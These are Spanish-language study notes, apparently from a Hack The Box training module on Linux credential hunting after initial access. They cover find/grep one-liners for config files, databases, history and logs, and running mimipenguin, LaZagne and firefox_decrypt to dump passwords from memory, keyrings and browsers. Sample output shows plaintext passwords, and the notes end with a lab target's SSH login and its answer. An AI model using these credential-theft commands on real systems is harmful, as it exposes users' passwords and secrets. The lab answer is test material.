La búsqueda de credenciales es un paso inicial clave tras conseguir acceso (por ejemplo un reverse shell) para facilitar la escalada de privilegios.
    
**Fuentes principales de credenciales (4 categorías):**
    1. **Archivos** — configuraciones, bases de datos, scripts, código fuente, cronjobs, claves SSH, notas.
    2. **Historial** — logs y historial de comandos (bash, zsh, etc.).
    3. **Memoria** — datos en RAM, caché y procesos que pueden contener credenciales temporales.
    4. **Conjuntos de claves** — credenciales guardadas en navegadores, gestores, stores del sistema.
    
Enumerar sistemáticamente esas fuentes aumenta las probabilidades de encontrar credenciales útiles; adaptarse siempre al contexto del sistema objetivo.

Se debe priorizar búsquedas según la función del sistema, combinar varias técnicas (archivos + historial + memoria) y evaluar impacto/ruido para no perder el acceso.

---
# 1. Archivos
Deberíamos numerar en Linux:
- Archivos de configuración: 
	- a menudo, almacenan en texto plano credenciales.
	- su extensión suele ser .config, .conf, .cnf.
- Bases de datos
- Notas
- Scripts
- Cronjobs
- Claves SSH

### ¿Cómo buscamos archivos de configuración?
Deberíamos listar todos los archivos de configuración del sistema y a posterior, si procede, analizarlos uno a uno.
El siguiente comando nos permitirá hacer dicha tarea:
```
Polika4RM@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done


File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
/etc/ltrace.conf
/etc/rygel.conf
....
/etc/mysql/conf.d/mysql.cnf
```

### ¿Cómo buscamos bases de datos?
Lo haremos con el siguiente comando:
```
Polika4RM@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
...
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
...
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
...
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db
```

### ¿Cómo buscamos notas?
Buscaremos exensiones tanto .txt como archivos sin extensión.
```shell-session
Polika4RM@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"

/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
<SNIP>
```

### ¿Cómo buscamos scripts?
Con el comando:
```shell-session
Polika4RM@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
<SNIP>
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh
```

---

## Enumerando cronjobs
Los trabajos cron son ejecuciones independientes de comandos, programas y scripts. 
Se dividen en el área de todo el sistema (/etc/crontab) y las ejecuciones dependientes del usuario. 

Algunas aplicaciones y scripts requieren credenciales para ejecutarse y, por lo tanto, se introducen incorrectamente en los trabajos cron. Además, existen áreas que se dividen en diferentes rangos de tiempo (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). Los scripts y archivos que utiliza cron también se pueden encontrar en /etc/cron.d/ para distribuciones basadas en Debian.

```shell-session
Polika4RM@htb[/htb]$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
Polika4RM@htb[/htb]$ ls -la /etc/cron.*/

/etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
<SNIP>
```

---
## Enumerando historial de archivos
Todos los archivos de historial proporcionan información crucial sobre el curso actual y pasado/histórico de los procesos. Nos interesan los archivos que almacenan el historial de comandos de los usuarios y los registros que almacenan información sobre los procesos del sistema.

En el historial de comandos introducidos en distribuciones de Linux que usan Bash como shell estándar, encontramos los archivos asociados en .bash_history. Sin embargo, otros archivos como .bashrc o .bash_profile pueden contener información importante.


El siguiente comando
```shell-session
Polika4RM@htb[/htb]$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

---
## Enumerando log files
Tanto el SO de Linux como programas de Linux guardan los logs en archivos de texto. En estos archivos encontramos errores de sistema, detectamos errores referentes a servicios concretos o podemos seguir que es lo que el programa está haciendo en background. 
Podemos dividir los logs en las siguientes categorías:
- Logs de aplicaciones
- Logs de eventos
- Logs de servicios
- Logs de sistema

Existen muchos registros diferentes en el sistema. Estos pueden variar según las aplicaciones instaladas, pero aquí se presentan algunos de los más importantes:
  
|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|

```shell-session
Polika4RM@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
<SNIP>
```

---

## Memoria y caché
#### Mimipenguin
Muchas aplicaciones y procesos utilizan las credenciales necesarias para la autenticación y las almacenan en memoria o en archivos para su reutilización. 
Por ejemplo, pueden ser las credenciales requeridas por el sistema para los usuarios que inician sesión. 

Otro ejemplo son las credenciales almacenadas en los navegadores, que también se pueden leer. Para recuperar este tipo de información de las distribuciones de Linux, existe una herramienta llamada mimipenguin que facilita todo el proceso. Sin embargo, esta herramienta requiere permisos de administrador o root:

```shell-session
Polika4RM@htb[/htb]$ sudo python3 mimipenguin.py

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
```

#### LaZagne
Una herramienta aún más potente que podemos usar, mencionada anteriormente en la sección "Búsqueda de credenciales en Windows", es LaZagne. Esta herramienta nos permite acceder a muchos más recursos y extraer las credenciales. Las contraseñas y hashes que podemos obtener provienen de las siguientes fuentes, entre otras:

- Wifi
- Wpa_supplicant
- Libsecret
- Kwallet
- Chromium-based
- CLI
- Mozilla
- Thunderbird
- Git
- ENV variables
- Grub
- Fstab
- AWS
- Filezilla
- Gftp
- SSH
- Apache
- Shadow
- Docker
- Keepass
- Mimipy
- Sessions
- Keyrings

Por ejemplo, "keyrings" se utiliza para el almacenamiento y la gestión seguros de contraseñas en distribuciones de Linux. Las contraseñas se almacenan cifradas y protegidas con una contraseña maestra. Se trata de un gestor de contraseñas basado en el sistema operativo, que analizaremos más adelante en otra sección. De esta forma, no es necesario recordar todas las contraseñas y se pueden guardar las contraseñas repetidas.

LaZagne se ejecuta con el comando:
```shell-session
Polika4RM@htb[/htb]$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
```

---

## Credenciales en navegadores
Los navegadores almacenan las contraseñas guardadas por el usuario de forma cifrada localmente en el sistema para su reutilización. Por ejemplo, Mozilla Firefox almacena las credenciales cifradas en una carpeta oculta para el usuario correspondiente. Estas suelen incluir los nombres de campo, las URL y otra información valiosa.

Por ejemplo, al almacenar las credenciales de una página web en Firefox, estas se cifran y se almacenan en logins.json en el sistema. Sin embargo, esto no significa que estén seguras allí. Muchos empleados almacenan estos datos de inicio de sesión en su navegador sin sospechar que pueden descifrarse fácilmente y usarse en contra de la empresa.

```
s -l .mozilla/firefox/ | grep default  

drwx------ 13 polika4r polika4r 4096 oct 10 19:13 1ig9y296.default-esr
drwx------  2 polika4r polika4r 4096 ago 31 13:56 5ah7n3rp.default
```

```shell-session
Polika4RM@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

La herramienta Firefox Decrypt es excelente para descifrar estas credenciales y se actualiza periódicamente. Requiere Python 3.9 para ejecutar la última versión. De lo contrario, se debe usar Firefox Decrypt 0.7.0 con Python 2.
```
Polika4RM@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

LaZagne también puede correr búsquedas en navegadores si utilizamos navegadores soportados por este servicio:
```
Polika4RM@htb[/htb]$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```

---
**Target(s): 10.129.101.108
SSH to  with user "kira" and password "L0vey0u1!"**
**1. Examine the target and find out the password of the user Will. Then, submit the password as the answer.

Ejecutando en la víctima un 
```
kira@nix01: python3.9 firefox_decrypt.py

Website: https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```